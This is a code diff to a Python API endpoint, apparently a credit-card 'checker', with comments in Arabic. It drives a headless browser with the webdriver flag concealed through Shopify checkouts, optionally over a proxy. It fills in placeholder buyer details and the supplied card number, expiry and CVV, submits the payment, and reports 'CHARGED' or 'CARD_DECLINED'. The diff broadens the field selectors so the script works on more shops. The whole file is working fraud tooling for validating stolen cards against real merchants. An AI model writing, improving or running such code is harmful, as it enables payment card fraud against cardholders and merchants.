@@ -18,46 +18,40 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
             
         context = await browser.new_context(**context_args)
         await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        
         page = await context.new_page()
         
         try:
-            # 1. الدخول لصفحة التشيك أوت
             await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
             
-            # 2. ملء البيانات باستخدام تحديد الأدوار (أكثر دقة في تجاوز الـ Timeout)
-            await page.get_by_role("textbox", name="Email").fill("testuser@gmail.com")
-            await page.get_by_placeholder("First name").fill("John")
-            await page.get_by_placeholder("Last name").fill("Doe")
-            await page.get_by_placeholder("Address").first.fill("123 Street")
+            # محددات شاملة للحقول لتجاوز الـ Timeout
+            await page.locator('input[type="email"], input[name*="email"]').first.fill("user@example.com")
+            await page.locator('input[name*="firstName"], input[placeholder*="First name"]').first.fill("John")
+            await page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first.fill("Doe")
+            await page.locator('input[name*="address1"], input[placeholder*="Address"]').first.fill("123 Street")
             
-            # 3. الانتقال للخطوة التالية
-            await page.get_by_role("button", name="Continue").click()
+            # الضغط على زر المتابعة
+            await page.locator('button[type="submit"], button:has-text("Continue")').first.click()
             await page.wait_for_load_state("networkidle", timeout=15000)
             
-            # 4. محاولة الضغط على "Continue to payment" إذا ظهرت
+            # محاولة تخطي خطوة الشحن
             try:
-                await page.get_by_role("button", name="Continue to payment").click(timeout=5000)
+                await page.locator('button:has-text("Continue to payment")').click(timeout=5000)
                 await page.wait_for_load_state("networkidle", timeout=15000)
             except:
                 pass
 
-            # 5. التعامل مع الـ iframe الخاص بالدفع
-            await page.wait_for_selector('iframe[title="Secure card payment input frame"]', timeout=20000)
-            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
+            # التعامل مع حقول الدفع
+            await page.wait_for_selector('iframe[title*="payment"]', timeout=20000)
+            frame = page.frame_locator('iframe[title*="payment"]')
             
-            # تعبئة البيانات
-            await frame.locator('input[name="number"]').fill(cc.split('|')[0])
-            await frame.locator('input[name="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
-            await frame.locator('input[name="verification_value"]').fill(cc.split('|')[3])
+            await frame.locator('input[name*="number"]').fill(cc.split('|')[0])
+            await frame.locator('input[name*="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
+            await frame.locator('input[name*="verification_value"]').fill(cc.split('|')[3])
             
-            # 6. الضغط على زر الدفع
-            await page.locator('button#continue-button').click()
+            await page.locator('button#continue-button, button:has-text("Pay now")').first.click()
             await page.wait_for_load_state("networkidle", timeout=15000)
             
-            # التحقق من النتيجة
             status = "true" if "thank-you" in page.url or "success" in page.content().lower() else "false"
-            
             await browser.close()
             return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
             
